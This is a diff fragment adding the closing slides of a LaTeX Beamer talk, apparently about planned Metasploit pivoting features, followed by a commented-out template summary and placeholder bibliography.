+  \end{sitemize}
+
+  \pause
+
+  \begin{sitemize}
+    \item Pivoting
+    \begin{sitemize}
+      \item Pivoting through custom metasploit proxying protocol
+      \item Fairly easy to implement, cross platform
+      \item More efficent than syscall proxying
+      \item "Network paths" should be really slick
+    \end{sitemize}
+  \end{sitemize}
+
+\end{frame}
+
+\section{Conclusion}
+
+\begin{frame}[t]
+  \frametitle{Conclusion}
+
+  \begin{sitemize}
+    \item Should be cool
+    \item Give us a year or more to make it
+  \end{sitemize}
+\end{frame}
+
+\pdfpart{Questions?}
+
+%%% summary and bib has been removed %%%
+\begin{comment}
+\section*{Summary}
+\begin{frame}[t]
+  \frametitle<presentation>{Summary}
+
+  % Keep the summary *very short*.
+  \begin{sitemize}
+  \item
+    The \alert{first main message} of your talk in one or two lines.
+  \item
+    The \alert{second main message} of your talk in one or two lines.
+  \item
+    Perhaps a \alert{third message}, but not more than that.
+  \end{sitemize}
+  
+  % The following outlook is optional.
+  \vskip0pt plus.5fill
+  \begin{sitemize}
+  \item
+    Outlook
+    \begin{sitemize}
+    \item
+      Something you haven't solved.
+    \item
+      Something else you haven't solved.
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+
+
+% All of the following is optional and typically not needed. 
+\appendix
+\section<presentation>*{\appendixname}
+\subsection<presentation>*{Materials}
+
+\begin{frame}[allowframebreaks]
+  \frametitle<presentation>{Materials}
+    
+  \begin{thebibliography}{10}
+    
+  \beamertemplatebookbibitems
+  % Start with overview books.
+
+  \bibitem{Author1990}
+    A.~Author.
+    \newblock {\em Handbook of Everything}.
+    \newblock Some Press, 1990.
+ 
+    
+  \beamertemplatearticlebibitems
+  % Followed by interesting articles. Keep the list short. 
+
+  \bibitem{Someone2000}
+    S.~Someone.
+    \newblock On this and that.
+    \newblock {\em Journal of This and That}, 2(1):50--100,
+    2000.
+  \end{thebibliography}
+\end{frame}
+\end{comment}
+
+\end{document}
